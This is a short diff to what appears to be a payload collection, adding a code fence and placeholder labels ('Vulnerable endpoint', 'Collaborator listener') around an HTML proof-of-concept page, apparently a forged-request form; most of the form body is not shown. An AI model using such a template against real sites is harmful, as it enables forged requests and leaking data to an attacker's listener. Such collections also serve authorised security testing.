@@ -1,3 +1,7 @@
+{ENDPOINT} - Vulnerable endpoint
+{My_Server} - Collaborator listener
+
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -21,3 +25,4 @@
     </form>
   </body>
 </html>
+```
